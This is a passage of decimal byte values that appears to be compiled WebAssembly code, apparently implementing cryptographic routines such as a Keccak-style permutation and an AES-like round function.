11,32,3,32,2,54,2,4,32,2,32,1,41,0,0,55,0,0,32,2,32,1,41,0,8,55,0,8,32,2,32,1,41,0,16,55,0,16,32,2,32,1,41,0,24,55,0,24,32,0,40,2,0,34,2,40,2,0,65,2,118,33,1,32,2,65,20,106,34,4,32,1,54,2,0,32,2,65,16,106,34,7,32,1,65,7,106,34,1,54,2,0,32,2,32,1,65,4,116,34,3,54,2,8,32,3,16,16,34,1,4,64,32,1,65,124,106,40,2,0,65,3,113,4,64,32,1,65,0,32,3,16,14,26,11,11,32,2,32,1,54,2,12,32,1,32,2,40,2,4,32,2,40,2,0,16,11,26,32,4,40,2,0,34,1,32,7,40,2,0,65,2,116,79,4,64,32,6,36,4,15,11,32,6,65,1,106,33,9,32,6,65,2,106,33,11,32,6,65,3,106,33,12,32,1,33,8,3,64,32,6,32,2,40,2,12,34,13,32,1,65,2,116,34,10,65,124,106,106,40,0,0,34,5,54,2,0,32,5,65,8,118,33,14,32,5,65,16,118,33,15,32,5,65,24,118,33,3,32,1,32,8,112,34,16,4,64,32,15,65,255,1,113,33,2,32,14,65,255,1,113,33,7,32,5,65,255,1,113,33,4,32,8,65,6,75,32,16,65,4,70,113,4,64,32,6,32,5,65,4,118,65,15,113,65,4,116,65,240,201,0,106,32,5,65,15,113,106,44,0,0,34,4,58,0,0,32,9,32,5,65,12,118,65,15,113,65,4,116,65,240,201,0,106,32,14,65,15,113,106,44,0,0,34,7,58,0,0,32,11,32,5,65,20,118,65,15,113,65,4,116,65,240,201,0,106,32,15,65,15,113,106,44,0,0,34,2,58,0,0,32,12,32,5,65,28,118,65,4,116,65,240,201,0,106,32,3,65,15,113,106,44,0,0,34,3,58,0,0,11,5,32,6,32,9,65,3,16,31,26,32,6,45,0,0,34,2,65,4,118,65,4,116,65,240,201,0,106,32,2,65,15,113,106,44,0,0,33,4,32,9,32,9,45,0,0,34,2,65,4,118,65,4,116,65,240,201,0,106,32,2,65,15,113,106,44,0,0,34,7,58,0,0,32,11,32,11,45,0,0,34,2,65,4,118,65,4,116,65,240,201,0,106,32,2,65,15,113,106,44,0,0,34,2,58,0,0,32,12,32,5,65,4,118,65,15,113,65,4,116,65,240,201,0,106,32,5,65,15,113,106,44,0,0,34,3,58,0,0,32,6,32,1,32,8,110,65,239,203,0,106,44,0,0,32,4,115,34,4,58,0,0,11,32,13,32,10,106,32,13,32,1,32,8,107,65,2,116,106,44,0,0,32,4,115,58,0,0,32,0,40,2,0,34,4,40,2,12,34,8,32,10,65,1,114,106,32,8,32,1,32,4,40,2,20,107,65,2,116,65,1,114,106,44,0,0,32,7,115,58,0,0,32,0,40,2,0,34,4,40,2,12,34,7,32,10,65,2,114,106,32,7,32,1,32,4,40,2,20,107,65,2,116,65,2,114,106,44,0,0,32,2,115,58,0,0,32,0,40,2,0,34,2,40,2,12,34,4,32,10,65,3,114,106,32,4,32,1,32,2,40,2,20,107,65,2,116,65,3,114,106,44,0,0,32,3,115,58,0,0,32,1,65,1,106,34,1,32,0,40,2,0,34,2,40,2,16,65,2,116,73,4,64,32,2,40,2,20,33,8,12,1,11,11,32,6,36,4,11,156,11,2,27,127,27,126,32,0,65,40,106,33,1,32,0,65,8,106,33,2,32,0,65,16,106,33,3,32,0,65,24,106,33,4,32,0,65,32,106,33,5,32,0,65,208,0,106,34,12,41,3,0,33,30,32,0,65,160,1,106,34,13,41,3,0,33,28,32,0,65,248,0,106,34,14,41,3,0,33,32,32,0,41,3,0,33,29,32,0,65,168,1,106,34,15,41,3,0,33,31,32,0,65,128,1,106,34,16,41,3,0,33,36,32,0,65,216,0,106,34,17,41,3,0,33,41,32,0,65,48,106,34,18,41,3,0,33,42,32,0,65,56,106,34,19,41,3,0,33,43,32,0,65,176,1,106,34,20,41,3,0,33,34,32,0,65,136,1,106,34,21,41,3,0,33,44,32,0,65,224,0,106,34,22,41,3,0,33,45,32,0,65,192,0,106,34,23,41,3,0,33,46,32,0,65,184,1,106,34,6,41,3,0,33,33,32,0,65,144,1,106,34,24,41,3,0,33,47,32,0,65,232,0,106,34,25,41,3,0,33,48,32,0,65,200,0,106,34,26,41,3,0,33,49,32,0,65,192,1,106,34,7,41,3,0,33,35,32,0,65,152,1,106,34,8,41,3,0,33,39,32,0,65,240,0,106,34,9,41,3,0,33,40,3,64,32,28,32,30,133,32,32,133,32,29,133,32,1,41,3,0,34,51,133,33,37,32,34,32,43,133,32,44,133,32,45,133,32,3,41,3,0,34,52,133,33,38,32,33,32,46,133,32,47,133,32,48,133,32,4,41,3,0,34,53,133,33,50,32,0,32,35,32,49,133,32,39,133,32,40,133,32,5,41,3,0,34,40,133,34,35,32,36,32,31,133,32,41,133,32,2,41,3,0,34,54,133,32,42,133,34,39,66,1,134,32,39,66,63,136,132,133,34,33,32,29,133,55,3,0,32,1,32,33,32,51,133,55,3,0,32,12,32,33,32,30,133,55,3,0,32,14,32,33,32,32,133,55,3,0,32,13,32,33,32,28,133,55,3,0,32,2,32,38,66,1,134,32,38,66,63,136,132,32,37,133,34,28,32,54,133,34,30,55,3,0,32,18,32,28,32,42,133,55,3,0,32,17,32,28,32,41,133,55,3,0,32,16,32,28,32,36,133,55,3,0,32,15,32,28,32,31,133,55,3,0,32,3,32,50,66,1,134,32,50,66,63,136,132,32,39,133,34,28,32,52,133,55,3,0,32,19,32,28,32,43,133,55,3,0,32,22,32,28,32,45,133,55,3,0,32,21,32,28,32,44,133,55,3,0,32,20,32,28,32,34,133,55,3,0,32,4,32,35,66,1,134,32,35,66,63,136,132,32,38,133,34,28,32,53,133,55,3,0,32,23,32,28,32,46,133,55,3,0,32,25,32,48,32,28,133,55,3,0,32,24,32,47,32,28,133,55,3,0,32,6,32,6,41,3,0,32,28,133,55,3,0,32,5,32,50,32,37,66,1,134,32,37,66,63,136,132,133,34,28,32,40,133,55,3,0,32,26,32,28,32,49,133,55,3,0,32,9,32,9,41,3,0,32,28,133,55,3,0,32,8,32,8,41,3,0,32,28,133,55,3,0,32,7,32,7,41,3,0,32,28,133,55,3,0,65,0,33,10,3,64,32,0,32,10,65,2,116,65,176,59,106,40,2,0,65,3,116,106,34,27,41,3,0,33,28,32,27,32,30,65,192,0,32,10,65,2,116,65,208,58,106,40,2,0,34,27,107,173,136,32,30,32,27,173,134,132,55,3,0,32,10,65,1,106,34,10,65,24,71,4,64,32,28,33,30,12,1,11,11,32,4,41,3,0,33,30,32,5,41,3,0,33,28,32,0,32,3,41,3,0,34,32,32,2,41,3,0,34,29,66,127,133,131,32,0,41,3,0,34,31,133,55,3,0,32,2,32,30,32,32,66,127,133,131,32,29,133,55,3,0,32,3,32,28,32,30,66,127,133,131,32,32,133,55,3,0,32,4,32,31,32,28,66,127,133,131,32,30,133,55,3,0,32,5,32,28,32,29,32,31,66,127,133,131,133,55,3,0,32,23,41,3,0,33,30,32,26,41,3,0,33,28,32,1,32,19,41,3,0,34,32,32,18,41,3,0,34,29,66,127,133,131,32,1,41,3,0,34,31,133,55,3,0,32,18,32,30,32,32,66,127,133,131,32,29,133,34,42,55,3,0,32,19,32,28,32,30,66,127,133,131,32,32,133,34,43,55,3,0,32,23,32,31,32,28,66,127,133,131,32,30,133,34,46,55,3,0,32,26,32,28,32,29,32,31,66,127,133,131,133,34,49,55,3,0,32,25,41,3,0,33,28,32,9,41,3,0,33,32,32,12,32,22,41,3,0,34,29,32,17,41,3,0,34,31,66,127,133,131,32,12,41,3,0,34,36,133,34,30,55,3,0,32,17,32,28,32,29,66,127,133,131,32,31,133,34,41,55,3,0,32,22,32,32,32,28,66,127,133,131,32,29,133,34,45,55,3,0,32,25,32,36,32,32,66,127,133,131,32,28,133,34,48,55,3,0,32,9,32,32,32,31,32,36,66,127,133,131,133,34,40,55,3,0,32,24,41,3,0,33,28,32,8,41,3,0,33,29,32,14,32,21,41,3,0,34,31,32,16,41,3,0,34,34,66,127,133,131,32,14,41,3,0,34,33,133,34,32,55,3,0,32,16,32,28,32,31,66,127,133,131,32,34,133,34,36,55,3,0,32,21,32,29,32,28,66,127,133,131,32,31,133,34,44,55,3,0,32,24,32,33,32,29,66,127,133,131,32,28,133,34,47,55,3,0,32,8,32,29,32,34,32,33,66,127,133,131,133,34,39,55,3,0,32,6,41,3,0,33,29,32,7,41,3,0,33,35,32,13,32,20,41,3,0,34,34,32,15,41,3,0,34,37,66,127,133,131,32,13,41,3,0,34,38,133,34,28,55,3,0,32,15,32,29,32,34,66,127,133,131,32,37,133,34,31,55,3,0,32,20,32,35,32,29,66,127,133,131,32,34,133,34,34,55,3,0,32,6,32,38,32,35,66,127,133,131,32,29,133,34,33,55,3,0,32,7,32,35,32,37,32,38,66,127,133,131,133,34,35,55,3,0,32,0,32,0,41,3,0,32,11,65,3,116,65,128,40,106,41,3,0,133,34,29,55,3,0,32,11,65,1,106,34,11,65,24,71,13,0,11,11,180,2,1,4,127,32,1,32,0,40,2,0,34,6,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,0,115,32,0,40,2,4,34,3,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,0,40,2,8,34,4,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,0,40,2,12,34,5,65,24,118,65,2,116,40,2,128,32,115,54,2,0,32,1,32,3,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,4,115,32,4,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,5,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,6,65,24,118,65,2,116,40,2,128,32,115,54,2,4,32,1,32,4,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,8,115,32,5,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,6,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,3,65,24,118,65,2,116,40,2,128,32,115,54,2,8,32,1,32,5,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,12,115,32,6,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,3,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,4,65,24,118,65,2,116,40,2,128,32,115,54,2,12,11,6,0,65,0,16,0,11,200,43,2,24,127,40,126,32,0,65,32,106,34,1,41,3,0,32,0,65,160,1,106,34,9,41,3,0,133,33,28,32,1,32,28,55,3,0,32,0,65,40,106,34,2,41,3,0,32,0,65,168,1,106,34,10,41,3,0,133,33,25,32,2,32,25,55,3,0,32,0,65,48,106,34,3,41,3,0,32,0,65,176,1,106,34,11,41,3,0,133,33,30,32,3,32,30,55,3,0,32,0,65,56,106,34,4,41,3,0,32,0,65,184,1,106,34,12,41,3,0,133,33,32,32,4,32,32,55,3,0,32,0,65,192,0,106,34,5,41,3,0,32,0,65,192,1,106,34,13,41,3,0,133,33,33,32,5,32,33,55,3,0,32,0,65,200,0,106,34,6,41,3,0,32,0,65,200,1,106,34,14,41,3,0,133,33,34,32,6,32,34,55,3,0,32,0,65,208,0,106,34,7,41,3,0,32,0,65,208,1,106,34,15,41,3,0,133,33,26,32,7,32,26,55,3,0,32,0,65,216,0,106,34,8,41,3,0,32,0,65,216,1,106,34,16,41,3,0,133,33,31,32,8,32,31,55,3,0,32,0,65,136,1,106,34,17,41,3,0,33,38,32,0,65,152,1,106,34,18,41,3,0,33,41,32,0,65,232,0,106,34,19,41,3,0,33,27,32,0,65,248,0,106,34,20,41,3,0,33,37,32,0,65,128,1,106,34,21,41,3,0,33,42,32,0,65,144,1,106,34,22,41,3,0,33,39,32,0,65,224,0,106,34,23,41,3,0,33,29,32,0,65,240,0,106,34,24,41,3,0,33,35,3,64,32,60,167,34,0,65,5,116,65,176,63,106,41,0,0,34,43,32,29,66,127,133,131,32,28,133,33,36,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,35,66,127,133,131,32,30,133,34,30,32,26,131,32,28,133,33,45,32,36,32,29,32,42,66,127,133,34,28,131,133,34,40,32,29,131,32,33,133,34,44,32,29,32,33,66,127,133,131,34,47,32,28,133,34,50,132,32,40,133,34,28,32,36,32,33,131,32,43,133,34,52,131,32,44,133,34,53,32,30,32,35,32,39,66,127,133,34,33,131,133,34,36,32,35,131,32,26,133,34,43,32,35,32,26,66,127,133,131,34,26,32,33,133,34,54,132,32,36,133,34,55,133,33,33,32,34,32,25,32,0,65,5,116,65,184,63,106,41,0,0,34,25,32,27,66,127,133,131,133,34,30,131,32,25,133,33,48,32,31,32,32,32,0,65,5,116,65,200,63,106,41,0,0,34,25,32,37,66,127,133,131,133,34,32,131,32,25,133,33,49,32,30,32,27,32,38,66,127,133,34,30,131,133,33,25,32,32,32,37,32,41,66,127,133,34,51,131,133,33,32,32,27,32,34,66,127,133,131,34,56,32,30,133,34,57,32,34,32,25,32,27,131,133,34,46,132,32,25,133,34,30,32,48,131,32,46,133,34,58,32,37,32,31,66,127,133,131,34,59,32,51,133,34,61,32,32,32,37,131,32,31,133,34,51,132,32,32,133,34,62,133,33,34,32,36,32,39,32,26,133,131,32,35,133,34,31,32,45,133,32,28,133,32,40,32,47,32,42,133,131,32,29,133,34,29,32,44,131,32,50,133,34,40,133,34,26,32,53,133,34,35,32,29,32,52,133,34,39,32,43,133,32,55,32,45,131,133,34,29,32,28,133,32,60,66,1,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,36,32,28,32,54,133,32,31,32,43,131,133,34,42,32,39,133,32,33,133,34,31,66,127,133,131,133,34,28,131,32,36,133,33,39,32,29,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,29,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,36,32,33,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,33,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,29,32,26,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,26,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,26,66,127,133,131,133,34,44,131,32,29,133,33,45,32,28,32,31,32,33,32,40,133,34,43,66,127,133,34,33,131,133,33,28,32,44,32,26,32,42,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,42,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,47,66,127,133,34,40,131,133,33,29,32,31,32,35,66,127,133,131,34,50,32,33,133,34,52,32,35,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,53,32,26,32,36,66,127,133,131,34,54,32,40,133,34,55,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,63,133,33,33,32,30,32,49,133,32,59,32,41,133,32,32,131,32,37,133,34,41,133,32,56,32,38,133,32,25,131,32,27,133,34,25,32,46,131,32,57,133,34,46,133,34,32,32,58,133,34,37,32,25,32,48,133,34,25,32,51,133,32,62,32,49,131,133,34,27,32,30,133,32,0,65,5,116,65,184,63,106,41,0,0,34,40,32,34,32,25,133,32,30,32,61,133,32,41,32,51,131,133,34,38,133,34,25,66,127,133,131,133,34,30,131,32,40,133,33,41,32,27,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,27,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,40,32,34,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,34,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,27,32,32,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,32,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,32,66,127,133,131,133,34,48,131,32,27,133,33,44,32,30,32,25,32,34,32,46,133,34,49,66,127,133,34,34,131,133,33,30,32,48,32,32,32,38,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,38,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,48,66,127,133,34,46,131,133,33,27,32,25,32,37,66,127,133,131,34,51,32,34,133,34,56,32,37,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,54,32,47,133,32,29,131,32,26,133,34,29,133,32,50,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,52,133,34,43,133,34,26,32,53,133,34,42,32,31,32,39,133,34,31,32,36,133,32,63,32,45,131,133,34,28,32,35,133,32,60,66,2,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,55,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,39,32,28,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,28,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,36,32,33,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,33,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,26,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,43,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,29,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,47,66,127,133,34,50,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,54,32,26,32,36,66,127,133,131,34,55,32,50,133,34,50,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,61,133,33,33,32,37,32,44,133,32,58,32,48,133,32,27,131,32,32,133,34,27,133,32,51,32,49,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,48,133,34,32,32,57,133,34,38,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,27,133,34,25,66,127,133,131,133,34,37,131,32,41,133,33,41,32,30,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,30,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,40,32,34,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,34,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,30,32,32,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,32,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,32,66,127,133,131,133,34,49,131,32,30,133,33,44,32,37,32,25,32,34,32,48,133,34,48,66,127,133,34,34,131,133,33,30,32,49,32,32,32,27,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,27,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,49,66,127,133,34,46,131,133,33,27,32,25,32,38,66,127,133,131,34,51,32,34,133,34,56,32,38,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,29,133,32,52,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,43,133,34,26,32,54,133,34,42,32,31,32,39,133,34,31,32,36,133,32,61,32,45,131,133,34,28,32,35,133,32,60,66,3,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,50,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,39,32,28,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,28,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,36,32,33,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,33,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,26,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,43,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,29,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,47,66,127,133,34,50,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,54,32,26,32,36,66,127,133,131,34,55,32,50,133,34,50,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,61,133,33,33,32,37,32,44,133,32,58,32,49,133,32,27,131,32,32,133,34,27,133,32,51,32,48,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,48,133,34,32,32,57,133,34,38,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,27,133,34,25,66,127,133,131,133,34,37,131,32,41,133,33,41,32,30,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,30,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,40,32,34,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,34,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,30,32,32,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,32,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,32,66,127,133,131,133,34,49,131,32,30,133,33,44,32,37,32,25,32,34,32,48,133,34,48,66,127,133,34,34,131,133,33,30,32,49,32,32,32,27,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,27,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,49,66,127,133,34,46,131,133,33,27,32,25,32,38,66,127,133,131,34,51,32,34,133,34,56,32,38,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,29,133,32,52,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,43,133,34,26,32,54,133,34,42,32,31,32,39,133,34,31,32,36,133,32,61,32,45,131,133,34,28,32,35,133,32,60,66,4,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,50,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,39,32,28,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,28,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,36,32,33,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,33,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,26,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,43,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,29,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,47,66,127,133,34,50,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,54,32,26,32,36,66,127,133,131,34,55,32,50,133,34,50,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,61,133,33,33,32,37,32,44,133,32,58,32,49,133,32,27,131,32,32,133,34,27,133,32,51,32,48,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,48,133,34,32,32,57,133,34,38,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,27,133,34,25,66,127,133,131,133,34,37,131,32,41,133,33,41,32,30,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,30,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,40,32,34,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,34,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,30,32,32,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,32,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,32,66,127,133,131,133,34,49,131,32,30,133,33,44,32,37,32,25,32,34,32,48,133,34,48,66,127,133,34,34,131,133,33,30,32,49,32,32,32,27,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,27,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,49,66,127,133,34,46,131,133,33,27,32,25,32,38,66,127,133,131,34,51,32,34,133,34,56,32,38,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,29,133,32,52,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,43,133,34,26,32,54,133,34,42,32,31,32,39,133,34,31,32,36,133,32,61,32,45,131,133,34,28,32,35,133,32,60,66,5,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,50,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,36,32,28,66,16,134,66,128,128,252,255,143,128,64,131,32,28,66,16,136,66,255,255,131,128,240,255,63,131,132,34,39,32,33,66,16,134,66,128,128,252,255,143,128,64,131,32,33,66,16,136,66,255,255,131,128,240,255,63,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,16,134,66,128,128,252,255,143,128,64,131,32,26,66,16,136,66,255,255,131,128,240,255,63,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,50,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,16,134,66,128,128,252,255,143,128,64,131,32,29,66,16,136,66,255,255,131,128,240,255,63,131,132,34,47,66,127,133,34,43,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,36,131,32,42,133,34,54,32,26,32,39,66,127,133,131,34,55,32,43,133,34,61,32,29,32,26,131,32,39,133,34,43,132,32,29,133,34,62,133,33,33,32,37,32,44,133,32,58,32,49,133,32,27,131,32,32,133,34,27,133,32,51,32,48,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,38,133,34,32,32,57,133,34,39,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,37,133,34,25,66,127,133,131,133,34,27,131,32,41,133,33,40,32,30,66,16,134,66,128,128,252,255,143,128,64,131,32,30,66,16,136,66,255,255,131,128,240,255,63,131,132,34,41,32,34,66,16,134,66,128,128,252,255,143,128,64,131,32,34,66,16,136,66,255,255,131,128,240,255,63,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,44,32,32,66,16,134,66,128,128,252,255,143,128,64,131,32,32,66,16,136,66,255,255,131,128,240,255,63,131,132,34,30,66,127,133,131,133,34,32,131,32,44,133,33,44,32,27,32,25,32,34,32,38,133,34,46,66,127,133,34,34,131,133,33,27,32,32,32,30,32,37,66,16,134,66,128,128,252,255,143,128,64,131,32,37,66,16,136,66,255,255,131,128,240,255,63,131,132,34,51,66,127,133,34,32,131,133,33,38,32,25,32,39,66,127,133,131,34,56,32,34,133,34,57,32,39,32,27,32,25,131,133,34,48,132,32,27,133,34,39,32,40,131,32,48,133,34,58,32,30,32,41,66,127,133,131,34,59,32,32,133,34,63,32,38,32,30,131,32,41,133,34,49,132,32,38,133,34,64,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,37,133,32,52,32,50,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,29,133,34,26,32,54,133,34,32,32,31,32,36,133,34,31,32,43,133,32,62,32,45,131,133,34,28,32,35,133,32,60,66,6,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,41,32,33,32,31,133,32,35,32,61,133,32,37,32,43,131,133,34,37,133,34,31,66,127,133,131,133,34,36,131,32,41,133,33,35,32,28,66,32,134,32,28,66,32,136,132,34,41,32,33,66,32,134,32,33,66,32,136,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,32,134,32,26,66,32,136,132,34,26,66,127,133,131,133,34,45,131,32,28,133,33,42,32,36,32,31,32,33,32,29,133,34,36,66,127,133,34,29,131,133,33,33,32,45,32,26,32,37,66,32,134,32,37,66,32,136,132,34,45,66,127,133,34,43,131,133,33,28,32,31,32,32,66,127,133,131,34,47,32,29,133,34,50,32,32,32,33,32,31,131,133,34,37,132,32,33,133,34,29,32,35,131,32,37,133,34,52,32,26,32,41,66,127,133,131,34,53,32,43,133,34,43,32,28,32,26,131,32,41,133,34,41,132,32,28,133,34,54,133,33,32,32,29,32,42,133,32,53,32,45,133,32,28,131,32,26,133,34,26,133,32,47,32,36,133,32,33,131,32,31,133,34,31,32,37,131,32,50,133,34,36,133,33,37,32,31,32,35,133,34,35,32,41,133,32,